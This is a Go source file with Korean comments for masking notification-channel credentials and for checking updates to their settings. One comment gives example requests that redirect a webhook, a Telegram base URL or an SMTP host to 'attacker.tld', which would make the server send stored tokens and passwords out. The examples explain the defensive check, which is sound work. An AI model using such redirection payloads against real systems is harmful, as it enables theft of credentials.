package notify

import (
	"encoding/json"
	"fmt"
	"strings"
)

// MaskedPrefix 는 마스킹된 값의 표시 접두사다. API가 자격 증명을 돌려줄 때 이 접두사를 붙인 값으로 실제 내용을 바꾸고,
// 갱신 API가 이 접두사가 붙은 값을 받으면 'DB의 원래 값을 그대로 유지'로 이해한다.
//
// 빈 문자열이나 고정 상수 대신 접두사를 쓰는 것은 알아볼 수 있는 정보를 조금 함께 실어
// (MaskedValue 참고), 사용자가 키를 다시 붙여 넣지 않고도 '어느 봇인지' 구분하게 하려는 것이다.
const MaskedPrefix = "__masked__"

// MaskedValue 는 마스킹된 값을 만든다.
//
//	"__masked__"              원래 값이 너무 짧아 아무 힌트도 주지 않는다
//	"__masked__:…ab12cd"      원래 값의 끝 6자리를 식별 힌트로 붙인다
//
// 끝 6자리만 드러내는 것은 일부러 고른 것이다. Webhook 주소의 식별 정보는 끝부분(WeCom의 key,
// Feishu의 봇 id 등)에 있고, 앞부분은 봇마다 같아 식별할 가치가 없다. 끝 6자리로는
// 자격 증명을 되살릴 수 없지만, 설정하는 사람이 '내 그 그룹'을 알아보기에는 충분하다.
func MaskedValue(secret string) string {
	if len(secret) <= 6 {
		return MaskedPrefix
	}
	return MaskedPrefix + ":…" + secret[len(secret)-6:]
}

// IsMasked 는 값이 마스킹된 값인지(즉 API가 돌려준 뒤 바뀌지 않았는지) 알려 준다.
func IsMasked(v string) bool { return strings.HasPrefix(v, MaskedPrefix) }

// MaskConfig 는 설정의 사본을 돌려주되, 이 알림 채널의 자격 증명 필드를 마스킹된 값으로 바꾼다.
//
// 모르는 알림 채널 유형이면 원래 설정이 아니라 빈 map을 돌려준다. UI가 '설정을 쓸 수 없음'을 보이는 편이
// 알림 채널 유형을 알아보지 못할 때 자격 증명이 들어 있을 수 있는 원래 내용을 통째로 돌려주는 것보다 낫다.
// 자격 증명이 아닌 필드는 그대로 두어야 UI가 제대로 보여 줄 수 있다.
func MaskConfig(kind string, cfg map[string]any) map[string]any {
	channel, ok := Get(kind)
	if !ok {
		return map[string]any{}
	}
	secrets := map[string]bool{}
	for _, k := range channel.SecretKeys() {
		secrets[k] = true
	}
	out := make(map[string]any, len(cfg))
	for k, v := range cfg {
		if !secrets[k] {
			out[k] = v
			continue
		}
		// headers 같은 중첩 구조는 통째로 자격 증명 하나로 다룬다. 하위 키마다 판단하려면 알림 채널마다
		// '어느 하위 키가 자격 증명인지' 규칙을 또 선언해야 해서 복잡도가 이득을 훨씬 넘는다.
		if s, ok := v.(string); ok {
			out[k] = MaskedValue(s)
			continue
		}
		out[k] = MaskedPrefix
	}
	return out
}

// ErrDestinationChangedWithoutCredentials 는 '대상 주소가 바뀌었는데 호출자가 자격 증명 필드를
// 다시 입력하지 않았다'는 뜻이다. 조용히 통과시키거나 자격 증명을 조용히 버리지 않고 이것을 돌려주는 이유는 PrepareConfigUpdate 참고.
type ErrDestinationChangedWithoutCredentials struct {
	Changed []string // 바뀐 목적지 키
	Missing []string // 명시적으로 다시 입력하지 않은 자격 증명 키
}

func (e *ErrDestinationChangedWithoutCredentials) Error() string {
	return "대상 주소(" + strings.Join(e.Changed, ", ") + ")가 바뀌었습니다. 자격 증명 필드(" +
		strings.Join(e.Missing, ", ") + ")도 다시 입력하세요. 새 값을 넣거나, 자격 증명이 더는 필요 없으면 비워 두세요. " +
		"기존 자격 증명은 이전 주소에만 유효하므로, 그대로 쓰면 새 주소에 넘겨주게 됩니다."
}

// PrepareConfigUpdate 는 알림 채널 설정을 병합하고, '대상 주소 변경'이라는 보안상 민감한 경우를 처리한다.
//
// 알림 채널 갱신 경로에서 맨 MergeConfig 대신 쓰며, 실제로 재현된 다음 경로를 막는다.
// 대상 주소(메시지를 어디로 보내는지)와 자격 증명(어떤 신원으로 보내는지)은 서로 독립된 필드인데, MergeConfig는
// '언급하지 않은 키'를 모두 DB의 원래 값으로 유지한다. 그래서 알림 채널을 PATCH할 수 있는 누구나 **주소만 바꾸고
// 자격 증명은 언급하지 않으면**, 서버가 DB의 진짜 자격 증명을 자기가 통제하는 엔드포인트로 보내게 만들 수 있다.
//
//	webhook  {config:{url:"https://attacker.tld"}}  → 원래 Authorization 헤더가 요청과 함께 나간다
//	telegram {config:{base_url:"https://attacker.tld"}} → /bot<진짜 Token>/sendMessage
//	email    {config:{host:"smtp.attacker.tld"}}    → STARTTLS 뒤 사용자 이름과 비밀번호를 넘긴다
//
// 이 경로는 아무 소리 없이 일어나고 리다이렉트에 의존하지 않으며(그래서 호스트를 넘는 이동 거부로는 막지 못한다),
// 이 패키지 마스킹 체계의 목표인 '자격 증명을 브라우저로 돌려보내지 않는다'를 그대로 뚫는다.
//
// 규칙: 목적지 키 하나라도 새 값으로 바뀌면 호출자는 **모든** 자격 증명 키를 명시적으로 다시 입력해야 한다.
//   - 새 값을 준다 → 새 값을 쓴다
//   - 빈 문자열을 명시적으로 보낸다 → 이 필드에 더는 자격 증명이 필요 없다(비우기 의미를 유지한다)
//   - 마스킹된 값을 그대로 돌려보낸다 / 이 키를 아예 언급하지 않는다 → 거부한다
//
// 셋째도 거부하는 것은 '마스킹된 값'의 뜻이 바로 '기존 자격 증명을 계속 쓴다'이고, 기존 자격 증명은
// 이전 주소에만 유효하기 때문이다. 여기서 '자격 증명을 자동으로 버리기'는 일부러 하지 않는다. 선택 자격 증명 필드
// (webhook의 headers, email의 password)에서는 그것이 '인증은 사라졌는데 API는 200을 돌려준다'로 소리 없이 바뀌어
// 오류보다 찾기 어렵다. 차라리 조작하는 사람이 한 번 더 입력하게 한다.
func PrepareConfigUpdate(kind string, stored, incoming map[string]any) (map[string]any, error) {
	channel, ok := Get(kind)
	if !ok {
		return nil, fmt.Errorf("알림 채널 유형 %q이(가) 등록되어 있지 않습니다", kind)
	}
	secrets := channel.SecretKeys()
	destinations := channel.DestinationKeys()

	// 문자열이 아닌 자격 증명 값(webhook의 headers는 객체다) 안에 마스킹 리터럴이 박혀 있으면,
	// 호출자가 '원래 값 유지' 센티넬을 구조체 안에 넣은 것이다. MergeConfig는 '문자열이면서
	// 접두사가 있는' 것만 마스킹으로 알아보므로, 이런 형태는 보통 객체로 그대로 저장된다. DB에 리터럴
	// "__masked__"가 실제로 남고, 이후 인증이 아무 오류 없이 소리 없이 무력해진다. 차라리 거부한다.
	//
	// 이 검사는 **맨 앞에** 두어야 한다. 주소가 바뀌지 않으면 일찍 반환하므로, 뒤에 두면
	// '주소 변경' 한 경로만 막게 된다(첫 버전이 바로 이렇게 잘못 두었고, 테스트가 바로 잡아냈다).
	if err := rejectMaskedInContainers(incoming, secrets); err != nil {
		return nil, err
	}

	// 실제로 바뀐 목적지 키를 찾는다. 마스킹된 값은 '바뀌지 않음'과 같다.
	var changed []string
	for _, key := range destinations {
		raw, present := incoming[key]
		if !present {
			continue
		}
		s, isStr := raw.(string)
		if isStr && IsMasked(s) {
			continue
		}
		if !sameConfigValue(raw, stored[key]) {
			changed = append(changed, key)
		}
	}
	if len(changed) == 0 {
		// 주소가 바뀌지 않았으면 보통 병합을 한다(마스킹된 값은 원래 값 유지, 빈 문자열은 비우기, 나머지는 덮어쓰기).
		return MergeConfig(stored, incoming), nil
	}

	// 주소가 바뀌었다. 모든 자격 증명 키를 명시적으로 다시 입력하도록 요구한다.
	var missing []string
	for _, key := range secrets {
		raw, present := incoming[key]
		if !present {
			missing = append(missing, key)
			continue
		}
		if s, isStr := raw.(string); isStr && IsMasked(s) {
			missing = append(missing, key)
		}
	}
	if len(missing) > 0 {
		return nil, &ErrDestinationChangedWithoutCredentials{Changed: changed, Missing: missing}
	}
	return MergeConfig(stored, incoming), nil
}

// rejectMaskedInContainers 는 마스킹 센티넬을 문자열이 아닌 구조 안에 넣어 제출하는 것을 거부한다.
//
// 마스킹 체계의 전제는 '값 전체가 문자열 하나'라는 것이다. webhook의 headers 같은 객체 필드는
// 통째로 마스킹하거나(문자열 "__masked__"로 쓴다) 통째로 제출할 수만 있다. 센티넬을 객체 안에 넣으면
// '그대로 유지'를 나타내지도 못하고, 실제 값으로 DB에 저장된다.
func rejectMaskedInContainers(incoming map[string]any, secretKeys []string) error {
	for _, key := range secretKeys {
		raw, present := incoming[key]
		if !present {
			continue
		}
		if _, isStr := raw.(string); isStr {
			continue
		}
		encoded, err := json.Marshal(raw)
		if err != nil {
			continue
		}
		if strings.Contains(string(encoded), MaskedPrefix) {
			return fmt.Errorf("필드 %s의 내용에 마스킹 표시 %q이(가) 들어 있습니다. 이 필드는 통째로 비워 두어 기존 값을 계속 쓰거나 새 값 전체를 제출해야 하며, 구조 안에 마스킹 자리표시자를 넣을 수 없습니다",
				key, MaskedPrefix)
		}
	}
	return nil
}

// sameConfigValue 는 두 설정값이 같은지 비교한다. JSON 직렬화로 비교하는 것은 타입 차이도
// 함께 처리하려는 것이다. 프런트가 제출한 포트는 number이고 DB에서 읽은 것은 float64라 == 로 바로 비교하면 잘못 판정한다.
//
// '비어 있음'은 먼저 정규화한 뒤 비교해야 한다. 이 설정 모델에서 빈 문자열과 '키 없음'은 같은 상태다.
// MergeConfig가 빈 문자열을 명시적 비우기로 보고 그 키를 바로 delete하기 때문이다. 정규화하지 않으면
// 늘 비워 두는 선택 목적지 필드(Telegram의 base_url이 이런 유일한 필드다. 비워 두면
// 공식 주소를 쓴다)가 다음 경로를 탄다.
//
//	만들 때 base_url:""을 저장  →  첫 저장에서 MergeConfig가 키를 지움
//	→ 두 번째 저장에서 incoming은 "", stored에는 키가 없어 '주소가 바뀜'으로 판정
//	→ 자격 증명이 마스킹된 값 → 400 '대상 주소가 바뀌었습니다. 자격 증명 필드도 다시 입력하세요'
//
// 그 뒤로는 사용자가 아무것도 바꾸지 않았는데도 Bot Token을 다시 붙여 넣지 않는 한 저장할 때마다 실패한다.
func sameConfigValue(a, b any) bool {
	if isBlankConfigValue(a) && isBlankConfigValue(b) {
		return true
	}
	ra, errA := json.Marshal(a)
	rb, errB := json.Marshal(b)
	if errA != nil || errB != nil {
		return false
	}
	return string(ra) == string(rb)
}

// isBlankConfigValue 는 설정값이 '비어 있음'인지 판정한다.
// 기준은 MergeConfig의 비우기 판정(strings.TrimSpace(s) == "")과 같아야 한다.
// 그러지 않으면 'MergeConfig는 지워야 한다고 보는데 sameConfigValue는 값이 있다고 보는' 틈이 생긴다.
func isBlankConfigValue(v any) bool {
	if v == nil {
		return true
	}
	s, ok := v.(string)
	return ok && strings.TrimSpace(s) == ""
}

// MergeConfig 는 incoming을 stored 위에 병합한다. 알림 채널 설정을 갱신할 때 쓴다.
//
// 규칙:
//   - incoming에서 값이 마스킹된 키 → stored의 원래 값을 유지한다(사용자가 이 필드를 바꾸지 않음)
//   - incoming에서 값이 빈 문자열인 키 → 명시적 비우기로 보고 그 키를 지운다
//   - 나머지 키 → incoming의 값으로 덮어쓴다
//   - stored에는 있고 incoming에는 없는 키 → 유지한다(부분 갱신 의미)
//
// 빈 문자열을 '비우기'로 볼지는 분명히 해야 한다. 프런트 폼은 입력하지 않은 필드를 빈 문자열로 제출하는데,
// 이것을 유효한 값으로 쓰면 '비워 두어 원래 값 유지'인 필드가 실제로 지워진다.
// 여기서는 명시적 비우기를 골랐다. 잘못 설정한 필드를 지우려 할 때 사용자에게 다른 표현 방법이 없기 때문이다
// (필드를 빼면 '제공 안 함'과 '빈 값 제공'을 구분할 수 있지만 UI는 이 차이를 쓰지 않는다).
func MergeConfig(stored, incoming map[string]any) map[string]any {
	out := make(map[string]any, len(stored)+len(incoming))
	for k, v := range stored {
		out[k] = v
	}
	for k, v := range incoming {
		if s, ok := v.(string); ok {
			if IsMasked(s) {
				continue // 마스킹된 값 = 바뀌지 않음, stored 유지
			}
			if strings.TrimSpace(s) == "" {
				delete(out, k)
				continue
			}
			out[k] = s
			continue
		}
		out[k] = v
	}
	return out
}
